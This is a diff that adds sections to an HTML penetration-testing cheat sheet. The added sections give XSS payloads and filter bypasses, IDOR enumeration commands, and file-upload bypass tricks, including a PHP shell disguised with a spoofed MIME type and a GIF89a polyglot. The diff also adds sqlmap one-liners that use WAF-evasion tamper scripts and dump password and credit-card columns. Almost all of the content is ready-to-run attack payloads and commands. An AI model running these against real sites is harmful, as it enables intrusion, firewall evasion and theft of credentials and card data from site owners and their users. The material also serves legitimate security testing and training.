@@ -1688,6 +1688,355 @@ netdiscover -i eth0 -r 192.168.1.0/24   # Specific interface</pre>
             </div>
         </div>
         
+        <!-- XSS -->
+        <div class="accordion-container" id="xss">
+            <div class="content-header">
+                <h1>🪄 Cross-Site Scripting (XSS)</h1>
+                <p>From basic payloads to DOM sinks and bypasses</p>
+            </div>
+            
+            <div class="accordion open">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">4.2</span>
+                        Beginner: Detect Reflected/Stored XSS
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Common Payloads</h3>
+                            <div class="code-block">
+                                <span class="code-label">HTML/Script Context</span>
+                                <pre>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Attribute/Event Context</span>
+                                <pre>" autofocus onfocus=alert(1) x="
+' onmouseover=alert(1) x='</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">URL Parameters</span>
+                                <pre>?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+?name=%22%20onmouseover%3Dalert(1)%20x%3D%22</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Where To Look</h3>
+                            <ul style="margin-left:20px;">
+                                <li>Search boxes, comment forms, profile fields (stored XSS)</li>
+                                <li>Any reflected parameter appearing in response, headers or script</li>
+                                <li>404 pages, error messages, redirects, preview widgets</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">4.3</span>
+                        Intermediate: Bypasses & Context-Aware Payloads
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Bypass Techniques</h3>
+                            <div class="code-block">
+                                <span class="code-label">Encoding</span>
+                                <pre>&lt;script&gt;alert(1)&lt;/script&gt;  →  %3Cscript%3Ealert(1)%3C%2Fscript%3E
+&lt;img src=x onerror=alert(1)&gt;  →  &amp;lt;img src=x onerror=alert(1)&amp;gt;</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Breaking Out</span>
+                                <pre>foo" onclick=alert(1) x="bar
+);alert(1);//</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Filtered Tags</span>
+                                <pre>&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;
+&lt;details open ontoggle=alert(1)&gt;&lt;summary&gt;x&lt;/summary&gt;&lt;/details&gt;</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Context Rules</h3>
+                            <ul style="margin-left:20px;">
+                                <li>HTML: inject tags or event handlers</li>
+                                <li>Attribute: close quote, inject event, re-open</li>
+                                <li>JS: end string/statement, inject code, comment remainder</li>
+                                <li>Style: URL() with javascript: blocked on modern browsers</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">4.4</span>
+                        Advanced: DOM XSS & CSP Considerations
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>DOM Sinks</h3>
+                            <div class="code-block">
+                                <span class="code-label">Common Sources → Sinks</span>
+                                <pre>location.hash → innerHTML / document.write
+document.referrer → .html() / .append()
+querySelector + .innerHTML</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Trigger Examples</span>
+                                <pre>#&lt;img src=x onerror=alert(1)&gt;
+?msg=%3Csvg%20onload%3Dalert(1)%3E</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>CSP Notes</h3>
+                            <ul style="margin-left:20px;">
+                                <li>Look for unsafe-inline or wildcard script-src</li>
+                                <li>Try nonces or hashes reuse via reflected blocks</li>
+                                <li>Abuse JSONP endpoints or inline event handlers if allowed</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- IDOR -->
+        <div class="accordion-container" id="idor">
+            <div class="content-header">
+                <h1>🧩 IDOR (Insecure Direct Object Reference)</h1>
+                <p>Access control testing: horizontal and vertical escalation</p>
+            </div>
+            
+            <div class="accordion open">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">4.5</span>
+                        Beginner: Identify Object References
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Targets</h3>
+                            <ul style="margin-left:20px;">
+                                <li>Numeric IDs: /user?id=123 → 124</li>
+                                <li>Path IDs: /api/orders/1001 → 1002</li>
+                                <li>Emails/Usernames: /profile?user=john → jane</li>
+                            </ul>
+                        </div>
+                        <div class="section">
+                            <h3>Quick Checks</h3>
+                            <div class="code-block">
+                                <span class="code-label">Manual</span>
+                                <pre>/account/1234
+/account/1235
+/admin/users/5</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Parameter Fuzzing</span>
+                                <pre>ffuf -u http://target.com/api/user?id=FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc 200</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">4.6</span>
+                        Intermediate: AuthZ Scenarios
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Horizontal vs Vertical</h3>
+                            <ul style="margin-left:20px;">
+                                <li>Horizontal: same role, other user’s data</li>
+                                <li>Vertical: escalate role (user → admin) actions/data</li>
+                            </ul>
+                        </div>
+                        <div class="section">
+                            <h3>Techniques</h3>
+                            <div class="code-block">
+                                <span class="code-label">Verb & Header Tricks</span>
+                                <pre>Try GET/POST/PUT/DELETE
+Remove cookies or auth header
+Set X-Original-URL / X-Rewrite-URL</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Multi-tenant</span>
+                                <pre>Switch orgId / tenantId / projectId
+Enumerate sequential identifiers</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">4.7</span>
+                        Advanced: Workflow & Blind IDOR
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Blind Discovery</h3>
+                            <div class="code-block">
+                                <span class="code-label">Differential Responses</span>
+                                <pre>Compare status/size/time for valid vs invalid IDs
+Correlate error messages and redirects</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Automation Hint</span>
+                                <pre>ffuf -u http://target.com/api/resource/FUZZ -w nums.txt -fc 403,404 -o idor_hits.json</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Business Logic</h3>
+                            <ul style="margin-left:20px;">
+                                <li>Approval flows: edit others’ pending requests</li>
+                                <li>Invoice/payment: access other users’ bills</li>
+                                <li>Export endpoints: download full datasets</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- File Upload -->
+        <div class="accordion-container" id="file-upload">
+            <div class="content-header">
+                <h1>📦 File Upload Vulnerabilities</h1>
+                <p>Validation bypasses, polyglots, and code execution paths</p>
+            </div>
+            
+            <div class="accordion open">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">4.8</span>
+                        Beginner: Validation Checks
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>What To Test</h3>
+                            <ul style="margin-left:20px;">
+                                <li>Extension filter (allow/deny lists)</li>
+                                <li>MIME type vs content (Content-Type vs magic bytes)</li>
+                                <li>Filename sanitization and path traversal</li>
+                                <li>Where files are stored and served</li>
+                            </ul>
+                        </div>
+                        <div class="section">
+                            <h3>Quick Uploads</h3>
+                            <div class="code-block">
+                                <span class="code-label">Basic</span>
+                                <pre>curl -F "file=@test.png" http://target.com/upload</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Spoof MIME</span>
+                                <pre>curl -F "file=@shell.php;type=image/png" http://target.com/upload</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">4.9</span>
+                        Intermediate: Bypasses & Polyglots
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Bypass Ideas</h3>
+                            <div class="code-block">
+                                <span class="code-label">Extensions</span>
+                                <pre>shell.php.jpg
+shell.PHP
+shell.php%20
+shell.p.ph.p</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Magic Bytes</span>
+                                <pre>GIF89a; &lt;?php echo 1; ?&gt;</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Metadata</span>
+                                <pre>Embed payload in EXIF (images) and trigger server-side parsing</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Discovery</h3>
+                            <div class="code-block">
+                                <span class="code-label">Find Upload Paths</span>
+                                <pre>ffuf -u http://target.com/uploads/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc 200,302</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">4.10</span>
+                        Advanced: Execution & Impact
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Execution Paths</h3>
+                            <ul style="margin-left:20px;">
+                                <li>Direct execution if server allows .php/.jsp in upload dir</li>
+                                <li>Local file inclusion to load uploaded file</li>
+                                <li>Image processing libraries executing embedded payloads</li>
+                            </ul>
+                        </div>
+                        <div class="section">
+                            <h3>Verification</h3>
+                            <div class="code-block">
+                                <span class="code-label">Access Uploaded File</span>
+                                <pre>curl http://target.com/uploads/shell.php
+curl http://target.com/uploads/test.png</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
         <!-- Web Enumeration -->
         <div class="accordion-container" id="web-recon">
             <div class="content-header">
@@ -1932,6 +2281,22 @@ admin' --</pre>
 sqlmap -u "http://target.com/page?id=1" -D database --tables
 sqlmap -u "http://target.com/page?id=1" -D database -T users --columns
 sqlmap -u "http://target.com/page?id=1" -D database -T users -C username,password --dump</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">All-in-One (DB Names finder )</span>
+                                <pre>sqlmap -u example.com --dbs --random-agent --keep-alive --threads=5 --no-cast --tamper=modsecurityversioned,space2comment --flush-session --fresh-queries --batch</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">All-in-One (Tables name find ,  remove ("database-name") )</span>
+                                <pre>sqlmap -u example.com --tables -D "database-name" --random-agent --keep-alive --threads=5 --no-cast --tamper=modsecurityversioned,space2comment --flush-session --fresh-queries --batch</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">All-in-One (Columns name find )</span>
+                                <pre>sqlmap -u example.com --columns -T users -D "database-name" --random-agent --keep-alive --threads=5 --no-cast --tamper=modsecurityversioned,space2comment --flush-session --fresh-queries --batch</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">All-in-One (Dump selected columns data , remove ("") )</span>
+                                <pre>sqlmap -u example.com --dump -C "cc,name,passwd,uname" -T users -D "database-name" --random-agent --keep-alive --threads=5 --no-cast --tamper=modsecurityversioned,space2comment --flush-session --fresh-queries --batch</pre>
                             </div>
                             
                             <div class="code-block">
